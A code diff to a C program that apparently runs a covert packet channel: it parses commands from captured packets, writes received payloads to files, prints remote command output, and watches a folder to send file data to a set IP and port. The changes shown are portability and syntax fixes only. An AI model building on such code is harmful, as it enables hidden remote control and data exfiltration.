@@ -207,12 +207,12 @@ void pkt_callback(u_char *ptr_null, const struct pcap_pkthdr* pkt_header, const 
 			}
 			
 			if (transferMode == CREATE_MODE){
-			 	if( (_access( fileName, 0 )) != -1 ) {
+			 	if( (access( fileName, 0 )) != -1 ) {
 			 		char tempName[256];
 			 		
 			 		int count=1;
 			 		sprintf(tempName, "%s%d", fileName, count);
-			 		while((_access( tempName, 0 )) != -1){
+			 		while((access( tempName, 0 )) != -1){
 			 			sprintf(tempName, "%s%d", fileName, count);
 			 			count++;
 			 			
@@ -224,14 +224,16 @@ void pkt_callback(u_char *ptr_null, const struct pcap_pkthdr* pkt_header, const 
 				}
 				
 			}
-			data = command + strstr(command, fileName) + strlen(fileName); 
+
+			data = strstr(command, fileName) ;
+			data += strlen(fileName); 
 			//open file and append payload data to file
 			fp = fopen(fileName, "a+");
 			if(fp==NULL){fprintf(stderr, "file open error\n"); return;}
 			fwrite(data, sizeof(char), strlen(data), fp);
 			fclose(fp);
 			
-		} elseif(packetMode == RESPONSE_MODE){// is command output
+		} else if(packetMode == RESPONSE_MODE){// is command output
 			//print command results to stdout
 			printf("%s\n", command);
 		}
@@ -387,7 +389,7 @@ int send_file_data(char * fileName, const struct ip_struct * ip, const int dest_
 int initFileMonitor(char * folder, const struct ip_struct * ip, const int dest_port){
 	
 	int len, i, ret, fd, wd;
-	struct timeval time;
+//	struct timeval time;
 	static struct inotify_event *event;
 	fd_set rfds;
 	char buf[BUFFER];
@@ -395,8 +397,8 @@ int initFileMonitor(char * folder, const struct ip_struct * ip, const int dest_p
 
 
 	// time out after 10 seconds	
-	time.tv_sec = 10;
-	time.tv_usec = 0;
+	//time.tv_sec = 10;
+	//time.tv_usec = 0;
 
 	fd = inotify_init();
 	if (fd < 0)
